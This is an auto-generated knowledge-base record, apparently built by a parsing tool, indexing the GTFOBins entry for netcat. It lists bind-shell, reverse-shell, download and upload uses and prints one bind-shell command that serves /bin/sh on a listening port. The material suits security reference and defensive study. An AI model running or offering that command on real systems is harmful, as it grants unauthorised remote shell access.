---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# nc

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `nc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for nc covering bind-shell, download, reverse-shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/nc.md)
- Source verification: [source record](../../sources/gtfobins/nc.md)

## Aliases

- `nc`

## Source Verification

[source record](../../sources/gtfobins/nc.md)

## Evidence Excerpt

```text
_body: ''
_name: nc
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc
functions:
bind-shell:
- code: nc -l -p 12345 -e /bin/sh
comment: This only works with netcat traditional.
connector: tcp-client
```
